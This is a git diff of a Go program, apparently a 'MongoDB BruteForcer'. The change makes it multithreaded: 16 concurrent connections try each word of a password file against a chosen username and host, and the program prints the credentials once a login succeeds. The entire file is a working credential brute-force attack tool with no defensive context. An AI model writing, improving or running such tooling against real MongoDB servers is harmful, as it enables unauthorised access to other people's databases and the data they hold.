@@ -3,11 +3,10 @@ package main
 import (
 	"flag"
 	"fmt"
-
 	"labix.org/v2/mgo"
-	//"labix.org/v2/mgo/bson"
 	"bytes"
 	"io/ioutil"
+	"os"
 )
 
 var VERBOSE bool
@@ -15,20 +14,23 @@ var PASSFILE string
 var HOSTNAME string
 var DB string
 var USERNAME string
+var THREADS int
+
+var COUNT int
+var TOTAL_WORDS int
 
 func login(db *mgo.Database, user, pass []byte) bool {
-	if VERBOSE {
-		fmt.Printf("Trying: %s:%s... ", user, pass)
-	}
+
+	// XXX: Check to make sure DB is still valid?
 	err := db.Login(string(user[:]), string(pass[:]))
-	if err != nil {
-		return false
-	} else {
+	if err == nil {
 		return true
+	} else {
+		return false
 	}
 }
 
-func passwords(filename string) [][]byte {
+func loadPasswords(filename string) [][]byte {
 	data, err := ioutil.ReadFile(filename)
 	if err != nil {
 		panic(err)
@@ -36,38 +38,68 @@ func passwords(filename string) [][]byte {
 	words := bytes.Split(data, []byte{'\n'})
 
 	fmt.Println("Loaded password list! Total words:", len(words))
+	TOTAL_WORDS = len(words)
 	return words
 }
 
-func main() {
-	flag.BoolVar(&VERBOSE, "verbose", false, "display each attempt")
-	flag.StringVar(&HOSTNAME, "hostname", "127.0.01", "hostname containing MongoDB")
-	flag.StringVar(&PASSFILE, "passfile", "pass.pass", "location of password file")
-	flag.StringVar(&DB, "database", "admin", "name of database to use")
-	flag.StringVar(&USERNAME, "username", "abc", "username to bruteforce")
-	flag.Parse()
-
-	session, err := mgo.Dial(HOSTNAME)
+func sessionBuilder(hostname, dbName string) (*mgo.Session, *mgo.Database) {
+	session, err := mgo.Dial(hostname)
 	if err != nil {
+		fmt.Println("Error building session")
 		panic(err)
 	}
-
-	username := []byte(USERNAME)
-	passwords := passwords(PASSFILE)
-
-	defer session.Close()
 	session.SetMode(mgo.Monotonic, true)
+	db := session.DB(dbName)
+	return session, db
+}
 
-	db := session.DB(DB)
-	for i, password := range passwords {
-		if login(db, username, password) {
-			fmt.Printf("\n-----WE DID IT %s %s-----\n", username, password)
-			fmt.Printf("Number of tries: %d\n", i)
-			return
-		} else {
-			if VERBOSE {
-				fmt.Println(" FAIL")
-			}
-		}
+func passwordProducer(filename string, passwordChan chan []byte) {
+	passwords := loadPasswords(filename)
+	for _, password := range passwords {
+		passwordChan<- password
 	}
+}
+ 
+func passwordConsumer(id int, user []byte, passwordChan chan []byte) {
+	session, db := sessionBuilder(HOSTNAME, DB)
+	count := 0
+	defer session.Close()
+
+	for {
+		password := <-passwordChan
+
+		if VERBOSE {
+			fmt.Printf("%d:\tcount: %d/%d, %s:%s\n", id, count, COUNT, user, password)
+		}
+
+		if login(db, user, password) {
+			fmt.Printf("WE DID IT!\n")
+			fmt.Printf("Password is %s:%s\n", user, password)
+			os.Exit(0)
+		}
+
+		count++
+		COUNT++
+	}	
+}
+
+func main () {
+	fmt.Println("-------- MongoDB BruteForcer -------")
+	flag.BoolVar(&VERBOSE, "verbose", false, "display each attempt")
+	flag.StringVar(&HOSTNAME, "hostname", "127.0.0.1", "hostname containing MongoDB")
+	flag.StringVar(&PASSFILE, "passfile", "pass.pass", "location of password file")
+	flag.StringVar(&DB, "database", "admin", "name of database to use")
+	flag.StringVar(&USERNAME, "username", "admin", "username to bruteforce")
+	flag.IntVar(&THREADS, "threads", 16, "number of db connections to use per machine")
+	flag.Parse()
+
+	passwordChannel := make(chan []byte, 10 * THREADS)
+	username := []byte(USERNAME)
+
+	for i := 0; i < THREADS; i++ {
+		go passwordConsumer(i, username, passwordChannel)
+	}
+	
+	passwordProducer(PASSFILE, passwordChannel)
+	
 }
